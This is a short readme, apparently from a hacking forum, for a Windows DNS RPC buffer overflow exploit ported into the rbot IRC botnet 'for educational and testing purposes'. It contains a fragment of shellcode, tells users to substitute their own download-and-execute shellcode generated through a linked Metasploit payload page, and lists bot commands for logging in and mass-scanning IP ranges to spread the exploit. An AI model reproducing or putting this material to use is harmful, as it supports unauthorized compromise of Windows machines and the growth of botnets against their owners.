MS Windows DNS RPC Remote Buffer Overflow Exploit (port 445) v2 exploit.
  readme:
  -ported to rbot by cyberboy for educational and testing purposes :D.
  -removed win2k3 code bcuz its impossible to sploit it.
  -litle fix...
  -tested to sploit win2k server sp4 us/french/itlalian/chinese os.
  -added external ip Resolver by my way www.whatismyip.com...
IMPORTANT:

[code]
unsigned char buf[] = 
"\x33\xc9\x83\xe9\xa0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46"
"\x0e\x7a\xbd\x83\xeb\xfc\xe2\xf4\xad\x1e\x20\xf7\x75\xc7\x1c\x04"
....
....;
[/code]


change shellcode buf in dnsxplc.cpp to ur own shellcode download + exec 
use following link for shellcode -->
http://www.metasploit.com:55555/PAYLOADS?MODE=SELECT&MODULE=%77%69%6e%33%32%5f%64%6f%77%6e%6c%6f%61%64%65%78%65%63




.login pass
.scan ip port delay // to scan specific ip 
.scan e port delay // to scan remote ip of bot
.killthread 1 // to kill scan